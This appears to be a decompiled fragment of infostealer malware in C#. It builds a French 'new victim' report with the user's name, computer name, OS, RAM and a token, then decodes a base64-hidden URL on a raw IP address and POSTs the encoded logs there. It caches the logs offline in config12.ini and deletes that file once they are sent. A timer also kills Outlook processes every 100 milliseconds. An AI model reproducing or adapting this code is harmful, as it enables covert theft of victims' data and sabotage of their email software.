			text = "\r\nBonjour, je suis une nouvelle victime ! Mon nom est " + Environment.UserName + " et je suis sur le PC : " + ((ServerComputer)Class2.Class1_0).get_Name() + ". Je me suis correctement lancé le " + Conversions.ToString(DateAndTime.get_Now()) + "\r\n\r\nDétails :\r\n\r\n-OS : " + ((ServerComputer)Class2.Class1_0).get_Info().get_OSFullName() + "\r\n-RAM Total : " + Conversions.ToString(Conversion.Int((double)((ServerComputer)Class2.Class1_0).get_Info().get_TotalPhysicalMemory() / 1232896.0)) + " mo\r\n-RAM Utilisé : " + Conversions.ToString(Conversion.Int((double)(((ServerComputer)Class2.Class1_0).get_Info().get_TotalPhysicalMemory() - ((ServerComputer)Class2.Class1_0).get_Info().get_AvailablePhysicalMemory()) / 1232896.0)) + " mo\r\n-Token : \r\n" + string_22 + "\r\n\r\n\r\nRésumé de l'installation :\r\n\r\n" + string_24 + "\r\n";
			byte[] bytes = Convert.FromBase64String("aHR0cDovLzk1LjIxMS4xODcuNS9teWxvZ3MucGhw");
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			string @string = uTF8Encoding.GetString(bytes);
			if (method_1(@string))
			{
				bytes = Convert.FromBase64String(string_23);
				string string2 = uTF8Encoding.GetString(bytes);
				@string = @string + "?to=" + string2 + "&name=" + ((ServerComputer)Class2.Class1_0).get_Name() + "&os=" + ((ServerComputer)Class2.Class1_0).get_Info().get_OSFullName() + "&username=" + Environment.UserName;
				if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
				{
					text = text + File.ReadAllText(Application.get_StartupPath() + "\\config12.ini") + "\r\n\r\nFIN logs OFFLINE - " + Conversions.ToString(DateAndTime.get_Now());
					FileSystem.Kill(Application.get_StartupPath() + "\\config12.ini");
				}
				try
				{
					WebRequest webRequest = WebRequest.Create(@string);
					webRequest.Method = "POST";
					UTF8Encoding uTF8Encoding2 = new UTF8Encoding();
					string s = text;
					byte[] bytes2 = uTF8Encoding.GetBytes(s);
					text = Convert.ToBase64String(bytes2);
					string s2 = "logs=" + text + "&token=" + string_22;
					byte[] bytes3 = uTF8Encoding2.GetBytes(s2);
					webRequest.ContentType = "application/x-www-form-urlencoded";
					webRequest.ContentLength = bytes3.Length;
					Stream requestStream = webRequest.GetRequestStream();
					requestStream.Write(bytes3, 0, bytes3.Length);
					requestStream.Close();
					WebResponse response = webRequest.GetResponse();
					requestStream = response.GetResponseStream();
					StreamReader streamReader = new StreamReader(requestStream);
					streamReader.ReadToEnd();
					streamReader.Close();
					requestStream.Close();
					response.Close();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				string_24 = null;
			}
			else if (File.Exists(Application.get_StartupPath() + "\\config12.ini"))
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			}
			else
			{
				File.AppendAllText(Application.get_StartupPath() + "\\config12.ini", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("\r\nDEBUT logs OFFLINE - " + Conversions.ToString(DateAndTime.get_Now()), "\r\n"), "\r\n"), text), "\r\n"), "\r\n"), method_5())));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer_4_Tick(object sender, EventArgs e)
	{
		Timer_4.set_Interval(100);
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName.Contains("OUTLOOK"))
			{
				process.Kill();
			}
		}
	}
}
